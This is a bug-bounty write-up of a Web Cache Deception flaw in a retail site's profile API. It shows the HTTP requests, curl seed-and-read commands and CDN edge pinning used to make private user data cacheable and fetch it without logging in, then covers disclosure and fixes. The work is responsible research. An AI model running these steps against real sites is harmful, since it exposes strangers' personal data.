Title: One .svg and a CDN: How a File Extension Leaked Strangers' PII

URL Source: https://medium.com/@abhinabshrestha9/one-svg-and-a-cdn-how-a-file-extension-leaked-strangers-pii-c8ca95ba5ddf

Published Time: 2026-09-11T16:20:50Z

Markdown Content:
[![Image 1: Abhinabshrestha](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*SKQ-RFasPGgh0gXN)](https://medium.com/@abhinabshrestha9?source=post_page---byline--c8ca95ba5ddf-----------------------------------------)

8 min read

1 day ago

_A walkthrough of a Web Cache Deception bug that turned a private profile API into a public one — and the story of how it got closed as a duplicate before being reopened and paid._

> It’s been a long while since I last wrote anything here. Life, work, and a long stretch of just heads-down hunting got in the way of writing it up. This bug felt like the right one to break the silence with — it’s a clean idea, and the story behind its resolution taught me more than the bug itself did. So, after a long time: hello again, and let’s get into it.

## TL;DR

A retail site exposed an authenticated profile API at:

/api/v2/account/profile
That endpoint is meant to return **your** data and nobody else’s. It carried the right cache headers (`private, no-cache, no-store`) and worked exactly as intended.

But if you appended a static file extension:

/api/v2/account/profile.svg
…the backend still returned the full profile JSON — and, because of the extension, it now came back with `Cache-Control: private, max-age=31536000`. The CDN in front of the app happily cached that response for a year and served it to **anyone** who visited the same URL, no cookies required.

Send a victim a link. They click it while logged in. Their name, email, phone number, loyalty card number, and hashed identifiers are now sitting on a public edge cache waiting for you to fetch them. That’s Web Cache Deception (WCD).

## What Web Cache Deception actually is

WCD, first popularized by Omer Gil in 2017, exploits a disagreement between two systems that are supposed to agree on one thing: _what is a cacheable file, and what is dynamic user data?_

*   The **CDN / cache** decides whether to store a response mostly by looking at the URL (does it end in `.svg`, `.css`, `.js`, `.png`?) and the cache headers.
*   The **application** decides what to _serve_ based on its own routing rules.

When those two disagree — the app treats `/profile.svg` as a live API call, but the cache treats it as a static image — sensitive dynamic content gets stored in a location that's shared across users.

Two ingredients have to line up:

1.   **Path confusion.** The app serves dynamic content for a URL that _looks_ static.
2.   **A cache willing to store it.** The response headers (or the CDN’s own rules) let it be cached and re-served.

This target had both.

## Finding it

I was poking at the site’s API surface. The profile endpoint was the obvious high-value target — it returns everything the account knows about you. Authenticated, it behaved correctly:

GET /api/v2/account/profile HTTP/2

Host: www.shop.example

Cookie: <valid session>HTTP/2 200

content-type: application/json; charset=utf-8

cache-control: private, max-age=0, no-cache, no-store

server-timing: cdn-cache; desc=MISS
`no-cache, no-store` — good. The CDN won't touch this.

The instinct with WCD is always: **does the framework normalize extensions?** Many backends (Rails, in this case) route `/profile.svg` to the same controller as `/profile`, stripping the extension during routing. So I tried it:

GET /api/v2/account/profile.svg HTTP/2

Host: www.shop.example

Cookie: <valid session>HTTP/2 200

content-type: application/json; charset=utf-8

cache-control: private, max-age=31536000 ← !!

server-timing: cdn-cache; desc=MISS
Two things jumped out:

1.   It still returned the **full profile JSON** — the extension was stripped, same controller, same data.
2.   The `Cache-Control` header had completely changed. `no-cache, no-store` was gone. In its place: `max-age=31536000` — one year.

That second point is the whole bug. The framework’s static-asset handling assumed anything ending in `.svg` was a safe, cacheable file and slapped a long-lived cache header on it — without realizing the _body_ was private user data.

## Confirming the cache actually stores and re-serves it

A changed header is a lead, not a finding. I needed to prove the CDN genuinely cached the response and served it to an unauthenticated stranger. “Could lead to” is not a bug; you have to build the chain.

**Step 1 — seed the cache (victim, authenticated):**

curl -sk "https://www.shop.example/api/v2/account/profile.svg" \

 -H "Cookie: <valid session>" -D -HTTP/2 200

cache-control: private, max-age=31536000

server-timing: cdn-cache; desc=MISS

server-timing: origin; dur=93

x-request-id: 1fcdeb65-3a1d-40b9-86a7-d01df8bf26c4
`MISS` — first request, went to origin, and the CDN just stored the response.

**Step 2 — read it back (attacker, no cookies at all):**

curl -sk "https://www.shop.example/api/v2/account/profile.svg" -D -HTTP/2 200

cache-control: private, max-age=31536000

server-timing: cdn-cache; desc=HIT

server-timing: edge; dur=1

x-request-id: 1fcdeb65-3a1d-40b9-86a7-d01df8bf26c4{

 "data": {

 "type": "users",

 "attributes": {

 "first-name": "<victim>",

 "last-name": "<victim>",

 "email": "victim@example.com",

 "email-md5": "<hash>",

 "email-sha256": "<hash>",

 "card-number": "<loyalty card>",

 "loyalty-tier": "...",

 "points": 50,

 "mobile-phone": "<phone>",

 "country-calling-code": "+..",

 "mobile-phone-md5": "<hash>",

 "admin": false,

 "is-employee": false

 }

 }

}
Three details nail it down:

*   `cdn-cache; desc=HIT` — the edge served this itself.
*   `edge; dur=1` — one millisecond, no origin roundtrip.
*   **The**`x-request-id`**is identical to the victim's request.** This is the same physical response object. No account, no session, no tools — just a GET to a URL, and I'm holding someone else's PII.

It worked in a browser too: open the URL in an incognito window and the victim’s data renders as raw JSON on screen.

## The gotcha that almost made me doubt myself

When I first tried to reproduce from a second machine, the attacker request sometimes returned a sign-in error instead of cached data. For a moment it looked flaky — the kind of inconsistency that makes you wonder if you imagined the whole thing.

## Get Abhinabshrestha’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

The cause was the CDN’s **anycast routing**. A large CDN answers `www.shop.example` from many physical edge nodes, and the cache is **per-edge**. Two machines can resolve the hostname to two different points of presence — and the copy I seeded lived on only one of them.

The fix for deterministic testing is `curl --resolve`, which pins the connection to a specific edge IP and skips DNS entirely:

# find candidate edges

dig +short www.shop.example# pin both requests to the SAME edge

curl -sk --resolve www.shop.example:443:203.0.113.10 \

 "https://www.shop.example/api/v2/account/profile.svg" -D -
Seed and read from the _same_ edge IP and it’s 100% reproducible.

It’s worth being clear about what this pinning does and does not mean for real-world impact. `--resolve` is a **testing** convenience, not an attack prerequisite. In practice, users on the same ISP or in the same region naturally land on the same PoP, and an attacker only has to try the handful of edge IPs `dig` returns until one gives a `HIT`. The bug is real; the pinning just removes the routing variable so a triager can reproduce it in one shot.

I put exactly this explanation in the report as a reproduction note, with the pinned commands. If your PoC depends on an environmental quirk, **explain the quirk** — half the “can’t reproduce → not applicable” closures happen because the triager hit the flaky path and gave up.

## Impact

One cached response leaked, per victim:

*   Full name, email, phone number (with country code)
*   Loyalty / membership card number
*   MD5 and SHA-256 of the email, MD5 of the phone — offline-crackable, and directly usable for cross-referencing in data-broker and breach corpora
*   Loyalty tier and points balance
*   `admin` / `is-employee` authorization flags
*   References to shipping addresses, saved cards, and stored payment tokens

The attacker needs **no account**. The only precondition is that the victim clicks a link while logged in — the same bar as a reflected XSS or a CSRF. And because the entry sat in cache with a one-year TTL, a single click had a long shelf life.

I scored it CVSS 3.1 **7.4 (High)** — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`. The scope change (`S:C`) is the honest part: the vulnerability lives in the app's headers, but the data crosses the trust boundary at the _caching layer_, a different component than the one that's broken.

## The part nobody puts in the writeup: it got closed as a duplicate

Here’s where it gets instructive.

I submitted. Standard “thanks, under review” auto-reply. A few days later the program updated the report — refined the title, tagged it CWE-200 / CWE-524, cleaned up the endpoint list — and then:

> **Status: Duplicate.** “Another hunter already submitted the same bug, and determined that we were not going to deploy a fix.” Closed. 2 points.

Two points is the polite version of “we already know, and we’ve decided to live with it.” For a High-severity PII leak, that stung — not because of the points, but because the reasoning was _“we’re not going to fix it.”_

Two things had happened in the meantime that changed the picture, and I’d already reported both:

1.   **I asked them to purge my PII from the cache** — my own test-account data was sitting on a public edge with a one-year TTL. That’s not a courtesy request; leaving it there is an ongoing exposure.
2.   **I’d found that the fix was incomplete.** They had removed the cached `.svg` variant — but `.png`, `.jpg`, `.jpeg`, and `.mp3`**still cached the exact same PII**, still with a ~one-year expiry. A cache rule that blocklists one extension isn't a fix; the framework's extension-stripping and the CDN's cache-on-static-extension behavior were both untouched. So the "known" bug was not only unfixed — it was demonstrably still exploitable through half a dozen other extensions.

So I pushed back. Not by arguing about points — by restating the **impact and the facts**: this leaks consumer PII, the remediation that was applied doesn’t close it, and here are the extensions that still work. Politely, once, with evidence.

A few days later:

> **Reopened → Under Review → Accepted.** “Indeed, while this is a duplicate of a previously submitted report, we have deemed it still valid because the fix was not fully implemented. We appreciate the additional context on other affected extensions.”
> 
> 
> Bounty + bonus points awarded.

## The lessons that actually transfer

**1. “Duplicate” is a status, not a verdict on your work.** A duplicate of an _unfixed_ bug — especially one where you can demonstrate the deployed remediation is incomplete — is a live vulnerability. If you’re bringing new, exploitable surface (new extensions, a bypass of the “fix”), that’s frequently enough to reopen. It was here.

**2. Argue impact, never points.** I never once mentioned the reward. Every message was about consumer PII exposure and the specific extensions still leaking. Triagers respond to _“here is data still leaking and here’s how”_ far better than to _“I deserve more.”_

**3. Test the fix, then test around it.** When a program says “fixed,” re-run your PoC — and then vary the one parameter the fix depends on. Here the fix was extension-specific, so the obvious probe was _other extensions_. The incompleteness was the whole reason it got accepted.

**4. Make your PoC reproducible on the first try.** The anycast/`--resolve` note probably saved this report. A bug that only reproduces "sometimes" reads as noise. Explain the environmental variable and hand the triager the deterministic command.

**5. Ask for your own data to be purged.** If your PoC seeds a shared cache with your PII and a long TTL, that data is exposed until it’s evicted. Requesting removal is both the right thing to do and a quiet reminder to the program that the issue is ongoing, not historical.

## For defenders: how to actually kill this

1.   **Never let a URL extension change your cache headers on dynamic routes.** Every response under `/api/` should carry `Cache-Control: private, no-cache, no-store, max-age=0` regardless of how the path ends. The static-asset header logic must not reach API controllers.
2.   **Don’t blocklist extensions — allowlist behavior.** Removing `.svg` from the cache while `.png`/`.jpg`/`.mp3` still leak is the exact trap this program fell into. Return `404` for any `/api/` path ending in a static extension, and normalize path handling so `/profile.svg` never routes to the profile controller at all.
3.   **Tell the CDN to never cache**`/api/`**.** Defense in depth: the edge should skip caching for API paths outright, and strictly honor `private` on anything that isn't a genuine static asset.

Fix the class, not the example.

_Written up with all client-identifying details, endpoints, and PII removed or replaced. The technique, headers, and story are real; the target is not named._
